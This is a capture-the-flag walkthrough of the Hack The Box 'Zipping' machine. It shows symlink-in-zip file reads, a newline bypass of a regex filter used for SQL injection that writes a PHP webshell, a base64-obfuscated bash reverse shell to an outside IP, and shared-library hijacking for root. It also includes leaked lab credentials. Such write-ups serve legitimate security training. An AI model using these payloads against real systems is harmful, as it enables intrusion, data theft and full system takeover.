# Zipping: HTB Machine: Medium

________________
### Nmap

PORT   STATE SERVICE REASON  VERSION
**22**/tcp open  ssh     syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)

**80**/tcp open  http    syn-ack Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: **Apache/2.4.54** (Ubuntu)

### Website Enum

The Website is a simple website with a shop and an upload function. 
In the "work for us" page They ask us to upload a file that must be **.zip** with a mandatory **.pdf** inside.

#### Upload

When we upload a zip file with a pdf inside the app decompress the zip and put the PDF inside an upload folder and make a random md5 hash folder between the file and the upload dir.

```
File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:
uploads/42c8a542c2c47451d3190adb93423ff3/Something.pdf
```

In *HackTricks* I found this:
- https://book.hacktricks.xyz/pentesting-web/file-upload

> If you can upload a ZIP that is going to be decompressed inside the server, you can do:

```sh
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```

So We can try:

```sh
ln  -s ../../../../../../../etc/passwd e_pass.pdf	# Make a symbolik Link of /etc/passwd named e_pass.pdf
zip --symlinks e_pass.zip e_pass.pdf			# Zip the symbolik link
# ---> Upload
```

Before opening the file to see the /etc/passwd file we need to intercept with burpsuite in order to see it.
It Works!

So Now we need to dig more and enumerate every page.

```sh
ln  -s ../../../../../../var/www/html/shop/index.php shop_index.pdf
zip --symlinks shop_index.zip shop_index.pdf

ln  -s ../../../../../../var/www/html/index.php index.pdf
ln  -s ../../../../../../var/www/html/shop/functions.php shop_functions.pdf
# do this for every pages until somethhing pops up..
```

Inside **/shop/functions.php** we found that the database used from the App to make the various interactions is authenticating as root.

```php
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
```

In **/shop/cart.php** the two parameters in Post request have a vulnerable preg_match function.
```php
preg_match(/^.*/)
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.

```php
// cart.php
...
   // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match))
```

To bypass this check you could send the value with **new-lines urlencoded (%0A)** or if you can send JSON data, send it in several lines:

## Foothold

Our Goal is to send the Payload via POST request into the "product_id" parameter.
We are going to target the MySQL database to create a new php page inside /var/lib/mysql where we can write because we have root privileges into the database and we can write and read from the webapp.

#### MySQL injection to write into outfile

From google:
```
There's a built-in MySQL output to file feature as part of the SELECT statement. We simply **add the words INTO OUTFILE, followed by a filename, to the end of the SELECT statement**. For example: SELECT id, first_name, last_name FROM customer INTO OUTFILE '/temp/myoutput
```

So we can write via mysql injection but the parameter is url encoded so we will do some base64 encoding:

### Path to Reverse Shell 

-  RevShell:
```sh
bash -i >& /dev/tcp/10.10.14.23/6666 0>&1
```

- PHP page to inject into new file:
```php
# Double base64 encode the Reverse Shell First, then the php code will decode it twice!!
<?php exec("echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eU15ODJOalkySURBK0pqRT0= | base64 -d | base64 -d | bash"); ?>
```

1. Base64 encode the whole php code:
```
PD9waHAgZXhlYygiZWNobyBXVzFHZW1GRFFYUmhVMEVyU21sQmRscEhWakpNTTFKcVkwTTRlRTFETkhoTlF6UjRUa00wZVUxNU9ESk9hbGt5U1VSQkswcHFSVDA9IHwgYmFzZTY0IC1kIHwgYmFzZTY0IC1kIHwgYmFzaCIpOyA/Pg==
```

2. MySQL Injection
```mysql
';select from_base64("PD9waHAgZXhlYygiZWNobyBXVzFHZW1GRFFYUmhVMEVyU21sQmRscEhWakpNTTFKcVkwTTRlRTFETkhoTlF6UjRUa00wZVUxNU9ESk9hbGt5U1VSQkswcHFSVDA9IHwgYmFzZTY0IC1kIHwgYmFzZTY0IC1kIHwgYmFzaCIpOyA/Pg==")+into+outfile+'/var/lib/mysql/rev.php'; --
```

3. Insert the %0A that will execute a new line, bypassing the preg_match and remember to URL encode everything:

```http
%0A'%3bselect+from_base64("PD9waHAgZXhlYygiZWNobyBXVzFHZW1GRFFYUmhVMEVyU21sQmRscEhWakpNTTFKcVkwTTRlRTFETkhoTlF6UjRUa00wZVUxNU9ESk9hbGt5U1VSQkswcHFSVDA9IHwgYmFzZTY0IC1kIHwgYmFzZTY0IC1kIHwgYmFzaCIpOyA/Pg==")+into+outfile+'/var/lib/mysql/rev.php'%3b --
```

4. Open a Netcat Listener with the port chosen
5. Send the POST request with Burpsuite
6. Trigger the reverse shell visiting: http://MACHINE_IP/shop/index.php?page=/var/lib/mysql/rev
7. Go grab the flag!

## Privesc to ROOT

As always, first command as a real user (after getting the flag) is "sudo -l".

```sh
sudo -l
...
User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

We can run the binary "/usr/bin/stock" as root.
The program ask for a password that is hardcoded inside the program, we can find it just with cat command and a little bit of good eye or with strings command:

```sh
cat /usr/bin/stock
#or
strings /usr/bin/stock
```

password: **St0ckM4nager**

Running the program itself it's not really helpfull.
We need to see the workflow as we are using the program.
For this job we'll use "**strace**". 

### Strace 
Strace allow us to see under the hood while we use the program so we better see how it is working, what library the binary call etc..

```sh
strace /usr/bin/stock

# .....
# read(0, St0ckM4nager
# "St0ckM4nager\n", 1024)         = 13
# openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so
# .....
```

After running the command, insert the password, we can see that the program try to open a file from the /home/ directory: "/home/rektsu/.config/libcounter.so". The only problem is that file does not exist.

**Hacktricks come to help us .....again!
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example

1. Make a C file like this and name it libcounter.c:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
} 
```

2. Compile the file and redirect the output to create the missing file:
```sh
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC libcounter.c
```

3. Execute the binary
```sh
sudo /usr/bin/stock
# enter the password
```

4. Get the root Flag!!